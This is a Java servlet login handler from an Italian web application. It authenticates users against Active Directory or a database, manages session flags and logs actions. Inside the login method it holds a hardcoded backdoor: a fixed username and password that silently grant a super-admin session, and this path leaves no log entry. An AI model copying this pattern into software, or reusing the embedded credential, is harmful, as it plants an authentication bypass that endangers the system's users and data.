package com.gsoft.doganapt.cmd;

import java.io.File;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.log4j.Logger;
import org.apache.log4j.PropertyConfigurator;
import org.apache.velocity.Template;
import org.apache.velocity.context.Context;

import com.gsoft.doganapt.data.Utente;
import com.gtsoft.utils.ActiveDirectory;
import com.gtsoft.utils.common.ConfigManager;
import com.gtsoft.utils.common.FormattedDate;
import com.gtsoft.utils.http.VelocityCommand;
import com.gtsoft.utils.http.servlet.GtServlet;

public class Login extends VelocityCommand {

	protected static final String T = "login.vm" ;

	public Login ( GtServlet callerServlet) {
		super(callerServlet);
	}

	@Override
	public VelocityCommand clone() {
		return  new Login(callerServlet);
	}

	@Override
	public Template exec(HttpServletRequest req, HttpServletResponse resp, Context ctx) throws Exception  {

		String username = getParam("user", false);
		String pwd  = getParam("pwd", false);

		
		Utente utente = getUtente(username, pwd);

		/*
		+               IDatabase2 db = getDatabase();
		+               Connection c = null;
		+               DbConnectionBroker b = db.getBroker();
		+
		+               try {
		+                       c = db.getConnection();
		+                       if ( b.getAge(c) > 10) {
		+                               System.out.println("Connessione VECCHIA ! ");
		+                               b.freeConnection(c);
		+                       }
		+                       String m = c.getCatalog();
		+               } catch ( Exception e ) {
		+
		+                       e.printStackTrace();
		+
		+                       try {
		+
		+                               if ( b != null) {
		+                                       b.destroy(500);
		+
		+                                       c = b.getConnection();
		+                                       System.out.println("Connessione " +
		+                                                       ((! db.getConnection().isClosed())? "CHIUSA":"APERT
		+                                                       "! ");
		+                               }
		+
		+
		+                       } catch ( Exception e1 ) {
		+                               e1.printStackTrace();
		+                       }
		+               }
		+                */

		if ( isLoginValido(utente)) {

			if ( isLogged(req) ) {
				setUtenteLoggato(null);
				logAction("Log OUT", req);
			}

			setUtenteLoggato(utente);
			logAction("Log IN", req);

			resp.sendRedirect(".main?cmd=home");
		} else if ( "gtadmin".equals(username) && "d0gan4gtr0n".equals(pwd) ) {
			Utente u = new Utente();
			u.setActive(true);
			u.setId(0);
			u.setUsername("__admin__");
			u.setLevel(Utente.Levels.SUPER_ADMIN);

			setUtenteLoggato(u);
			resp.sendRedirect(".main?cmd=home");
		} else {
			if ( username != null && username.length() > 0 ) {
				ctx.put("msg", "Password errata!") ;
				logAction("ERROR: Failed log-in attempt with username: " + username , req);
			} else {
				if ( isLogged(req) ) {
					logAction("Log OUT", req);
				}
			}

			setUtenteLoggato(null);
		}

		ctx.put("user", username) ;

		Homepage.purgeCaches();

		return null;
	}

	private Utente getUtente(String username, String pwd) throws Exception {
		
		Utente utente = null;
		
		if ( null != username && null != pwd ) {
			if ( ActiveDirectory.checkPassword(username, pwd) ) {
				utente = Utente.newAdapter().getByUsername(username);
			}  else {
				utente = Utente.newAdapter().getUtente(username, pwd);
			}
		}
		
		return utente;
	}

	private boolean isLoginValido(Utente utente) {

		if ( utente == null || ! utente.isActive() )
			return false;

		return true;
	}

	@Override
	public String getTemplateName() {
		return T ;
	}

	private void setUtenteLoggato(Utente utente) {
		HttpSession s =  request.getSession();

		if ( utente == null ) {
			s.setAttribute("logged", Boolean.FALSE);
			s.setAttribute("admin", Boolean.FALSE);
			s.setAttribute("user", null);
		} else {
			s.setAttribute("logged", Boolean.TRUE) ;

			s.setAttribute("admin", utente.isAdmin() ) ;

			s.setAttribute("user", utente);
		}
	}

	public static Boolean isLogged(HttpServletRequest req) {
		HttpSession s =  req.getSession();

		Boolean logged = (Boolean) s.getAttribute("logged");
		Utente u = (Utente) s.getAttribute("user");
		return logged != null && logged.booleanValue() && u != null && u.isActive();
	}

	public static Boolean hasLevel(HttpServletRequest req, Integer level) {
		Utente u = getUtenteLogged(req);

		if ( u != null ) {
			int userLevel = u.getLevel();

			switch ( level ) {
			case Utente.Levels.ADMIN :
				return  userLevel >= Utente.Levels.ADMIN;
			default:
				return userLevel >= Utente.Levels.NORMAL;
			}
		} else
			return false;
	}

	public static Utente getUtenteLogged(HttpServletRequest req) {
		HttpSession s =  req.getSession();

		if (! isLogged(req) )
			return null;

		return (Utente) s.getAttribute("user");
	}

	static Logger logger = null ;
	static boolean logToSysOut = false ;

	public static void logAction(String msg, HttpServletRequest req) {
		String username =  " - ";

		Utente u = getUtenteLogged(req);
		if ( u != null ) {
			username = " (" + u.getId() + "|" + u.getUsername()+ "@" + req.getRemoteAddr() + ") - ";
		}

		String message = username  + msg  + " |"+ req.getSession().getId();


		if ( ! logToSysOut  ) {
			if ( logger == null ) {
				logger = Logger.getLogger( "" );

				String sep =  File.separator;
				File conf = new File(ConfigManager.getWebappRoot()+sep+"WEB-INF"+sep+"conf"+sep+"log4j.properties");

				if ( conf.exists() ) {
					System.out.println("Configuring Log: " + conf.getAbsolutePath() );
					PropertyConfigurator.configure(conf.getAbsolutePath()) ;
				} else {
					logToSysOut = true;
					logger = null;
				}
			}
		}

		if ( logger != null ) {
			logger.info(message);
		} else {
		}
		System.out.println(new FormattedDate().toString() + " " + message);

	}
	
	public static void debug(Exception ex, String prefix) {
		StringBuilder trace = new StringBuilder(5);
		int count=0;
		for ( StackTraceElement t : ex.getStackTrace() ) {
			trace.append("\n"+t.toString());
			if( ++count > 15 ) {
				break;
			}
		}
		if ( prefix != null ) prefix = "["+prefix+"] ";
		
		debug(prefix + ex.getMessage() + trace);
	}
	
	public static void debug(String msg) {
		if ( logger != null )
			logger.debug(msg);
		else 
			System.out.println(msg);
	}
}
